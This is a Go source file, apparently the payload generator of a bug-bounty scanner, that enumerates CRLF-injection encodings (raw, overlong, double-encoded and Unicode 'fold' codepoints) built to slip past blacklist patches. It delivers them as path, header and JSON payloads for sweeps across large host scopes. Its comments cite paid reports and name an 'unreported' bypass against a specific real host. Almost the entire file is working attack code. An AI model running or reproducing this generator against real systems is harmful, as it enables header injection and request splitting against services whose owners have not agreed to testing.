// Package vectors is the FLAMER stage: it generates the malformed encodings that a
// vulnerable stack may fold into a bare CR or LF.
//
// THE RULE. Every confirmed bypass in the 8x8 voapi report chain — spanning 2023-03 to
// 2025-12, five separate patches, six paid criticals — obeys one rule:
//
//	a codepoint whose LEAST-SIGNIFICANT BYTE is 0x0A (or 0x0D)
//	survives a lossy 32->8 or 16->8 narrowing in the backend.
//
//	%0A          U+000A   raw
//	%C4%8A       U+010A   Ċ        (Frans Rosen)
//	%DC%8A       U+070A   ܊        (Syriac; the newest bypass)
//	%E0%AC%8A    U+0B0A   ଊ        (Oriya)
//	%E5%98%8A    U+560A   嘊       (the classic double-encoding)
//	%F0%9F%98%8A U+1F60A  😊
//
// PortSwigger's flamer documents the same primitive from the other side — "a server
// decodes UTF-8 then truncates codepoints mod-256" — but delivers it as raw wire bytes
// in a header. This package delivers it PERCENT-ENCODED IN THE PATH, which reaches a
// different gadget: an application that URL-decodes the path and reforwards it into a
// backend request line. Nobody has enumerated that space, so this generates all of it
// rather than shipping the six payloads that happen to be public.
//
// A blacklist patch can only ever remove points from this set. The set is the reason
// the same host paid out five times.
package vectors

import (
	"fmt"
	"sort"
	"strings"
	"unicode/utf8"
)

// Class is the control character SEQUENCE a vector is trying to become.
//
// SEQUENCE, not character, and that word is the whole of this fix. `lf` and `cr` are one byte
// each, `crlf` is two, and the generator used to hold the mapping as a `map[byte]Class` — one
// byte per class, so the two-byte sequence had nowhere to live. `ClassCRLF` was declared here
// and reached nothing: `Generate`'s switch mapped only LF and CR, and both `selectVectors`
// copies parsed only "lf" and "cr".
//
// The failure was not that `class=crlf` scanned nothing. It is that an unrecognised token was
// DROPPED, leaving the class list empty, and an empty list means "both" — so asking for CRLF
// silently ran the default LF/CR sweep and reported success over ground it never covered. That
// is the bounded-sweep-that-reads-as-complete lie invariant 8 exists to forbid, and it is why
// {@link ParseClasses} now refuses a token it does not know instead of ignoring it.
type Class string

const (
	ClassLF   Class = "lf"
	ClassCR   Class = "cr"
	ClassCRLF Class = "crlf"
)

// classSeq is the control-byte sequence each Class is trying to become.
//
// A CRLF vector is therefore the CR vector and the LF vector CONCATENATED — for the fold
// family, a codepoint whose low byte is 0x0D followed by one whose low byte is 0x0A, at the
// same narrowing offset. `č` (U+010D) then `Ċ` (U+010A) narrows to a real `\r\n`; both halves
// are separately confirmed in `known` above. That is the same rule the package header states,
// applied to a two-byte target instead of a one-byte one — not a new primitive.
var classSeq = map[Class][]byte{
	ClassLF:   {0x0A},
	ClassCR:   {0x0D},
	ClassCRLF: {0x0D, 0x0A},
}

// classOrder fixes the iteration order. `Generate` used to range a map, so the output order
// depended on Go's map randomisation and only the final `sort.Slice` made it stable; the
// generated corpus is content-addressed by a regeneration test, so the order a vector is BUILT
// in must not be a coin flip.
var classOrder = []Class{ClassLF, ClassCR, ClassCRLF}

// ParseClasses turns a caller's `class` string ("lf,cr" / "crlf") into the classes to generate.
//
// ONE IMPLEMENTATION, because there were two and they had already drifted: the actor's
// `selectVectors` matched case-sensitively and `foldscan`'s upper-cased both sides, so the
// "same scanner" the FOLDSCAN doc promises answered `--only` differently depending on which
// binary you ran it from. Case-insensitive here, once.
//
// AN UNKNOWN TOKEN IS AN ERROR, NOT A SHRUG. A typo that silently widens the sweep to the
// default is worse than one that stops it: the run still finishes, still writes rows, and still
// reads as coverage of something it never sent a byte at.
func ParseClasses(s string) ([]Class, error) {
	if strings.TrimSpace(s) == "" {
		return nil, nil // nil means "the default", which Generate spells out
	}
	var out []Class
	seen := map[Class]bool{}
	for _, tok := range strings.Split(s, ",") {
		tok = strings.ToLower(strings.TrimSpace(tok))
		if tok == "" {
			continue
		}
		c := Class(tok)
		if _, ok := classSeq[c]; !ok {
			return nil, fmt.Errorf("unknown vector class %q (want lf, cr or crlf)", tok)
		}
		if !seen[c] {
			seen[c] = true
			out = append(out, c)
		}
	}
	return out, nil
}

// Family is how the vector tries to get there.
type Family string

const (
	// FamilyRaw is the unobfuscated control character. It is the control probe: if a
	// target answers it, the target was never patched and the fold families prove nothing.
	FamilyRaw Family = "raw"

	// FamilyFold is the core family: a legal UTF-8 codepoint whose low byte is the
	// target control character, relying on a narrowing conversion downstream.
	FamilyFold Family = "utf8-fold"

	// FamilyOverlong is a non-shortest-form UTF-8 encoding of the control character
	// itself. Strict decoders reject it; permissive ones emit the raw byte.
	FamilyOverlong Family = "overlong"

	// FamilyDouble survives one decode pass as a literal percent-escape and becomes
	// the control character on the second — the classic two-tier proxy/app split.
	FamilyDouble Family = "double-encoded"
)

// Tier bounds scan cost. A full sweep of the fold space is ~4,700 vectors, which at a
// polite one request per second is over an hour per target — unusable across a scope of
// tens of thousands of hosts. Tier 1 is the everything-sweep; higher tiers are for hosts
// that already showed a transformation.
const (
	TierQuick    = 1 // ~35 vectors: raw, all 2-byte folds, overlongs, double-encodings, known 3-byte
	TierStandard = 2 // + every 3-byte fold (U+0800..U+FFFF)
	TierFull     = 3 // + 4-byte folds (astral plane)
)

// Vector is one generated encoding.
type Vector struct {
	ID        string `json:"id"`
	Family    Family `json:"family"`
	Class     Class  `json:"class"`
	Codepoint string `json:"codepoint,omitempty"` // "U+070A"
	Encoded   string `json:"encoded"`             // "%DC%8A" — goes in the request path verbatim
	// Control is the matched negative: the identical construction one value higher, so
	// it has the same length and shape but does not fold to a control character. The
	// differential is Encoded vs Control, never Encoded vs "/".
	Control string `json:"control"`
	// WireBytes is what a decoder receives: the percent-decoded form, hex, space-separated.
	// It is what to write into a header value, where nothing URL-decodes for you.
	WireBytes string `json:"wire_bytes"`
	// JSONEsc is the same codepoint as a JSON string escape. A JSON parser decodes
	// "\u070a" to U+070A and the mod-256 narrowing happens downstream of that, so a JSON
	// body is a first-class delivery context, not an afterthought.
	JSONEsc string `json:"json_escape,omitempty"`
	Tier    int    `json:"tier"`
	Known   bool   `json:"known"` // confirmed working somewhere in the wild
	Note    string `json:"note,omitempty"`
}

// known maps a codepoint to the report or source that confirmed it, so a hit on a known
// vector can be told apart from a genuinely new one.
var known = map[rune]string{
	0x000A:  "raw LF — H1 #1893764",
	0x000D:  "raw CR",
	0x010A:  "Ċ — Frans Rosen / H1 #2704607",
	0x010D:  "č — PortSwigger flamer request-format docs (folds to CR)",
	0x070A:  "܊ Syriac — newest voapi.8x8.com bypass, unreported",
	0x0B0A:  "ଊ Oriya — H1 #3340283",
	0x560A:  "嘊 — H1 #2095676",
	0x1F60A: "😊 — H1 #3340283 (astral, same rule)",
}

// Generate returns every vector at or below the requested tier, deduplicated and in a
// stable order. classes selects which control characters to target; nil means both.
func Generate(tier int, classes []Class) []Vector {
	if len(classes) == 0 {
		// THE DEFAULT IS THE TWO SINGLE-BYTE CLASSES, deliberately, and `crlf` is opt-in. A CRLF
		// vector is two folds where the others are one, so folding it into the default would
		// double the cheapest sweep's cost for every caller that never asked for it.
		classes = []Class{ClassLF, ClassCR}
	}
	want := make([]Class, 0, len(classes))
	seenClass := map[Class]bool{}
	for _, c := range classOrder {
		for _, req := range classes {
			if req == c && !seenClass[c] {
				seenClass[c] = true
				want = append(want, c)
			}
		}
	}

	var out []Vector
	seen := map[string]bool{}
	add := func(v Vector) {
		if v.Encoded == "" || seen[v.Encoded] {
			return
		}
		seen[v.Encoded] = true
		out = append(out, v)
	}

	// EVERY FAMILY IS BUILT OVER THE CLASS'S BYTE SEQUENCE, joined. For `lf` and `cr` the
	// sequence is one byte and every line below produces exactly the bytes it produced before
	// this change — which is what lets the regeneration tests stay untouched. For `crlf` it is
	// two, and each family becomes its own CR form followed by its own LF form.
	//
	// The matched control survives the join unchanged: the control for a sequence is the same
	// construction with EVERY component one value higher, so it keeps the same length, the same
	// encoding shape and the same byte count, and varies only whether the components' low bytes
	// are newlines. `čĊ` against `ďċ`, never against `/`.
	joinBy := func(seq []byte, f func(byte) string) string {
		var sb strings.Builder
		for _, b := range seq {
			sb.WriteString(f(b))
		}
		return sb.String()
	}

	for _, class := range want {
		seq := classSeq[class]
		lead := rune(seq[0]) // the component that names the vector; see the fold IDs below

		codepoints := func(off rune) string {
			parts := make([]string, len(seq))
			for i, b := range seq {
				parts[i] = fmt.Sprintf("U+%04X", rune(b)+off)
			}
			return strings.Join(parts, " ")
		}

		// FamilyRaw — the control probe. If a target answers this, it was never
		// patched, and a hit on any fold family proves nothing new.
		rawEnc := joinBy(seq, func(b byte) string { return encRaw(rune(b)) })
		add(Vector{
			ID: fmt.Sprintf("raw-%s", class), Family: FamilyRaw, Class: class,
			Codepoint: codepoints(0),
			Encoded:   rawEnc,
			Control:   joinBy(seq, func(b byte) string { return encRaw(rune(b) + 1) }),
			WireBytes: hexOf(seq), Tier: TierQuick, Known: true,
			Note: known[lead],
		})

		for _, n := range []int{2, 3, 4} {
			enc := joinBy(seq, func(b byte) string { return encOverlong(n, rune(b)) })
			add(Vector{
				ID: fmt.Sprintf("overlong%d-%s", n, class), Family: FamilyOverlong, Class: class,
				Codepoint: codepoints(0),
				Encoded:   enc,
				Control:   joinBy(seq, func(b byte) string { return encOverlong(n, rune(b)+1) }),
				WireBytes: hexOf(mustDecode(enc)), Tier: TierQuick,
				Note: fmt.Sprintf("%d-byte overlong form", n),
			})
		}

		for _, f := range []int{1, 2, 3} {
			add(Vector{
				ID: fmt.Sprintf("double%d-%s", f, class), Family: FamilyDouble, Class: class,
				Encoded: joinBy(seq, func(b byte) string { return encDouble(f, rune(b)) }),
				Control: joinBy(seq, func(b byte) string { return encDouble(f, rune(b)+1) }),
				Tier:    TierQuick, Note: "requires two decode passes",
			})
		}

		// FamilyFold — the main event.
		//
		// THE OFFSET IS THE ITERATOR, not the codepoint, because a multi-component class moves
		// all of its components together: at offset 0x100 `crlf` is U+010D then U+010A, the pair
		// that narrows to a real carriage-return/line-feed. Naming the vector after its LEAD
		// codepoint keeps the `fold-<class>-u<hex>` shape every `--only` filter and every stored
		// row already uses, and the offset determines the rest of the pair, so it stays unique.
		for off := rune(0x100); rune(seq[len(seq)-1])+off <= 0x10FFFF; off += 0x100 {
			skip, t, isKnown := false, TierQuick, true
			var notes []string
			for _, b := range seq {
				cp := rune(b) + off
				if cp >= 0xD800 && cp <= 0xDFFF {
					skip = true // a surrogate is not a codepoint; the whole sequence goes
					break
				}
				// THE MOST EXPENSIVE COMPONENT SETS THE TIER. A pair is only as cheap to send as
				// its longer half, so taking the max is what keeps `tier` an honest cost bound.
				if ct := tierOf(cp); ct > t {
					t = ct
				}
				note, ok := known[cp]
				isKnown = isKnown && ok // KNOWN only if EVERY half is separately confirmed
				if note != "" {
					notes = append(notes, note)
				}
			}
			if skip {
				continue
			}
			// A publicly-confirmed vector is the highest-prior-probability payload in
			// the whole space and must be in the cheapest sweep, whatever its encoded
			// length. Tagging it tier 1 after the fact never worked: generation had
			// already skipped it.
			if isKnown {
				t = TierQuick
			}
			if t > tier {
				continue
			}
			var wire []byte
			for _, b := range seq {
				wire = append(wire, []byte(string(rune(b)+off))...)
			}
			add(Vector{
				ID:     fmt.Sprintf("fold-%s-u%04x", class, lead+off),
				Family: FamilyFold, Class: class,
				Codepoint: codepoints(off),
				Encoded:   joinBy(seq, func(b byte) string { return encFold(rune(b) + off) }),
				Control:   joinBy(seq, func(b byte) string { return encFold(rune(b) + off + 1) }),
				WireBytes: hexOf(wire), Tier: t, Known: isKnown,
				// A KNOWN CODEPOINT KEEPS ITS CITATION; EVERY OTHER ONE GETS THE RULE, SAID OUT LOUD.
				//
				// `notes` is only ever populated from the `known` table, so for a GENERATED codepoint
				// this was the empty string — and generated codepoints are almost the whole family.
				// MEASURED on `techniques_s1`: 8,680 of 8,686 fold vectors carried no explanation at
				// all, which is 70% of the entire corpus and the whole of the axis somebody demoing
				// this would be pointing at. A row that cannot say why it exists is a row a reader has
				// to take on faith.
				Note: foldNote(class, codepoints(off), notes),
			})
		}
	}

	for i := range out {
		wire := decodePercent(out[i].Encoded)
		out[i].WireBytes = hexOf(wire)
		out[i].JSONEsc = jsonEscape(wire)
	}

	sort.Slice(out, func(i, j int) bool {
		if out[i].Tier != out[j].Tier {
			return out[i].Tier < out[j].Tier
		}
		if out[i].Known != out[j].Known {
			return out[i].Known
		}
		return out[i].ID < out[j].ID
	})
	return out
}

// tierOf assigns a codepoint to a scan tier by its UTF-8 length.
func tierOf(cp rune) int {
	switch {
	case cp < 0x800:
		return TierQuick
	case cp < 0x10000:
		return TierStandard
	default:
		return TierFull
	}
}

func pct(b []byte) string {
	var sb strings.Builder
	for _, c := range b {
		fmt.Fprintf(&sb, "%%%02X", c)
	}
	return sb.String()
}

// decodePercent applies one percent-decode pass, giving the bytes a server sees after it
// unescapes the path — which is the input the narrowing conversion actually operates on.
func decodePercent(s string) []byte {
	var out []byte
	for i := 0; i < len(s); i++ {
		if s[i] == '%' && i+2 < len(s) {
			var v int
			if _, err := fmt.Sscanf(s[i+1:i+3], "%02x", &v); err == nil {
				out = append(out, byte(v))
				i += 2
				continue
			}
		}
		out = append(out, s[i])
	}
	return out
}

// jsonEscape renders the bytes as a JSON string fragment. Valid UTF-8 becomes a \uXXXX
// escape of each codepoint (with a surrogate pair above the BMP); anything else — overlong
// forms, bare control bytes — falls back to per-byte escapes.
//
// EVERY codepoint, not just the first. This decoded ONE rune and required it to span the whole
// buffer, so the moment a class carried two components — which is every `crlf` fold vector —
// the check failed and it fell through to the per-BYTE arm. That arm emits `Ä…`,
// which a JSON parser decodes to `Ä` and a stray control, NOT to U+010D. The JSON delivery
// context is first-class here (the header says so), so the escape for a two-codepoint vector
// has to be the two codepoints.
func jsonEscape(b []byte) string {
	if utf8.Valid(b) {
		var sb strings.Builder
		for _, r := range string(b) {
			if r > 0xFFFF {
				r -= 0x10000
				fmt.Fprintf(&sb, "\\u%04x\\u%04x", 0xD800+(r>>10), 0xDC00+(r&0x3FF))
				continue
			}
			fmt.Fprintf(&sb, "\\u%04x", r)
		}
		return sb.String()
	}
	var sb strings.Builder
	for _, c := range b {
		fmt.Fprintf(&sb, "\\u%04x", c)
	}
	return sb.String()
}

// mustDecode turns a percent-encoded string back into wire bytes, for the WireBytes
// field. Only ever called on strings this package just produced.
func mustDecode(s string) []byte {
	var out []byte
	for i := 0; i+2 < len(s); i += 3 {
		var v int
		fmt.Sscanf(s[i:i+3], "%%%02x", &v)
		out = append(out, byte(v))
	}
	return out
}

func hexOf(b []byte) string {
	parts := make([]string, len(b))
	for i, c := range b {
		parts[i] = fmt.Sprintf("%02x", c)
	}
	return strings.Join(parts, " ")
}

// ScreenOf picks a cheap, high-prior screening set out of an already-selected corpus: for each
// class present, the raw control probe and the most-likely fold.
//
// WHY THIS EXISTS. The screen is two vectors per class, sent at every injection point, and the
// actor's default named them by ID — `raw-lf,fold-lf-u070a`. Those IDs are LF-CLASS IDs, so the
// moment a caller asked for a different class the default selected NOTHING. Under the old
// fail-open behaviour that silently promoted the screen to the whole corpus (2 vectors to 31 at
// every one of up to 40 points, a 15.5x traffic increase nobody asked for); under the new strict
// one it refuses the Session outright. Both are wrong for a caller who changed `class` and left
// `screen` alone, which is every caller.
//
// Derived rather than typed, so it stays correct for a class that does not exist yet:
//
//	FamilyRaw     the unobfuscated control character. If a target answers THIS it was never
//	              patched, and a hit on any fold family proves nothing new — so it is the first
//	              thing worth asking and it costs one request.
//	FamilyFold    the first KNOWN codepoint of that class, which is the highest prior probability
//	              in the whole space: it is a payload somebody has already been paid for. With no
//	              known fold (a class whose space nobody has reported yet) the cheapest one stands
//	              in, because a screen with no fold in it cannot screen for folding at all.
func ScreenOf(vs []Vector) []Vector {
	raw := map[Class]Vector{}
	fold := map[Class]Vector{}
	for _, v := range vs {
		switch v.Family {
		case FamilyRaw:
			if _, seen := raw[v.Class]; !seen {
				raw[v.Class] = v
			}
		case FamilyFold:
			cur, seen := fold[v.Class]
			// Known beats unknown; among equals the corpus order already ranks by tier then id.
			if !seen || (v.Known && !cur.Known) {
				fold[v.Class] = v
			}
		}
	}
	var out []Vector
	for _, c := range classOrder {
		if v, ok := raw[c]; ok {
			out = append(out, v)
		}
		if v, ok := fold[c]; ok {
			out = append(out, v)
		}
	}
	return out
}

// foldNote is the sentence a fold vector carries when nothing published cites it.
//
// ── WHY GENERATED VECTORS NEEDED ONE AT ALL ──────────────────────────────────────────────────────
//
// `notes` is filled only from the `known` table — the codepoints somebody has already been paid
// for. Everything else is generated by the rule in this package's header, and carried an EMPTY
// explanation into the `techniques` Dataset: 8,680 of 8,686 fold rows, measured. That is the
// majority of the corpus arriving at a report, a triage queue and a slide with nothing to say for
// itself, and "it was generated" is not an answer a reader can check.
//
// ── IT STATES THE RULE FOR THIS CODEPOINT, NOT A GENERALITY ─────────────────────────────────────
//
// The sentence names the actual codepoint, the actual low byte and what that byte becomes, so a
// reader can verify it against the row's own `wire_bytes` rather than trusting a blanket paragraph
// somewhere else. A cited vector keeps its citation and gains the rule after it: provenance and
// mechanism answer different questions, and the citation was never an explanation of HOW it works.
func foldNote(class Class, points string, notes []string) string {
	target := map[Class]string{
		ClassCR:   "a carriage return (0x0D)",
		ClassLF:   "a line feed (0x0A)",
		ClassCRLF: "a carriage return then a line feed (0x0D 0x0A)",
	}[class]
	if target == "" {
		return strings.Join(notes, " + ")
	}
	rule := points + " — percent-encoded in the path, these are ordinary characters that no parser " +
		"treats as a line break. Their low bytes are those of " + target + ". A backend that decodes " +
		"the path and then NARROWS each character to a single byte — a cast to char, a truncating " +
		"UTF-8 decode, an encoding conversion that drops the high bits — is left holding the real " +
		"control byte, and the header this value was placed in becomes two lines to that parser and " +
		"one line to the proxy in front of it. That disagreement is the whole bug."
	if len(notes) == 0 {
		return rule
	}
	// Confirmed first: it is the stronger claim, and it is the half a triager acts on.
	return strings.Join(notes, " + ") + ". " + rule
}
